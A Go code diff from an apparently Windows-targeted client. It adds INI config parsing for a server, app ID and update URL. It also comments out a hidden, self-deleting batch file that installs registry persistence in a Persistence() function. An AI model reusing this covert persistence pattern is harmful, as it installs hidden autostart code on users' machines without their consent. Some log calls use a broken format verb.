@@ -19,9 +19,19 @@ import (
 )
 
 var (
-	conFile   = flag.String("configfile", "\\src\\config.ini", "config file")
-	conFile_2 = flag.String("configfile_2", "\\src\\config_2.ini", "config file")
+	conFile   = flag.String("configfile", string(os.PathSeparator)+"config.ini", "config file")
+	conFile_2 = flag.String("configfile_2", string(os.PathSeparator)+"config_2.ini", "config file")
 )
+
+type Configuration struct {
+	Server string
+	AppID  string
+
+	UpdateUrl string
+	Uate      uint8
+	Mine      [3]byte
+	Too       uint16
+}
 
 // getMacAddr gets the MAC hardware
 // address of the host machine
@@ -44,18 +54,45 @@ func GetMacAddr() (addr string) {
 	}
 	return
 }
-func Open_config() (cfg *config.Config) {
+func Open_config() (cfg_ *config.Config, c Configuration) {
 	//获取当前路径
+	var err error
+	var server, appID, updateUrl string
+	var cf Configuration
+	var cfg *config.Config
 	file, _ := os.Getwd()
 	log.Printf("读取窗口信息 %s", file)
 	log.Printf("读取窗口信息 %v", runtime.NumCPU())
-	cfg, err := config.ReadDefault(file + *conFile)
+	cfg, err = config.ReadDefault(file + *conFile)
 
 	if err != nil {
 		log.Printf("无法找到", *conFile, err)
 	}
 
-	return cfg
+	//获取配置文件中的配置项
+	_, err = cfg.String("TTN", "DeviceID")
+	if err != nil {
+		log.Printf("无法读取 $v", err)
+	}
+
+	server, err = cfg.String("TTN", "Server")
+	if err != nil {
+		log.Printf("无法读取 $v", err)
+	}
+
+	appID, err = cfg.String("TTN", "AppID")
+	if err != nil {
+		log.Printf("无法读取 $v", err)
+	}
+	updateUrl, err = cfg.String("UPDATE", "url")
+	if err != nil {
+		log.Printf("无法读取 $v", err)
+	}
+
+	cf.AppID = appID
+	cf.Server = server
+	cf.UpdateUrl = updateUrl
+	return cfg, cf
 
 }
 
@@ -108,12 +145,12 @@ func Persistence() {
 	PERSIST.WriteString(string(DecodedRegAdd))
 	PERSIST.Close()
 
-	Exec := exec.Command("cmd", "/C", "PERSIST.bat")
-	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Exec.Run()
-	Clean := exec.Command("cmd", "/C", "del PERSIST.bat")
-	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	Clean.Run()
+	/*	Exec := exec.Command("cmd", "/C", "PERSIST.bat")
+		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		Exec.Run()
+		Clean := exec.Command("cmd", "/C", "del PERSIST.bat")
+		Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		Clean.Run()*/
 
 }
 
